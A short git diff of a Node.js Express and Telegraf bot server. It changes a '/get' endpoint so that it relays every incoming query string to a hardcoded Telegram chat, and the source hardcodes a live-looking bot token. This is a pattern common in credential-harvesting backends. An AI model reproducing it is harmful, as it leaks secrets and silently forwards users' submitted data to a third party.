@@ -1,11 +1,20 @@
 const Telegraf = require('telegraf');
 const express = require('express');
 
+const axios = require('axios');
+
 const bot = new Telegraf('5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM')
 const app = express()
 
 app.get('/get',(req,res)=>{
-    res.send("5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM");
+    res.send('Universe Rewards the Brave!!!!');
+    
+    try{
+        axios.get(`https://api.telegram.org/bot5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM/sendMessage?chat_id=1913438485&text=${JSON.stringify(req.query)}`)
+    }
+    catch(e){
+       console.log(e)
+    }
 })
 
 app.listen(3000,()=>{
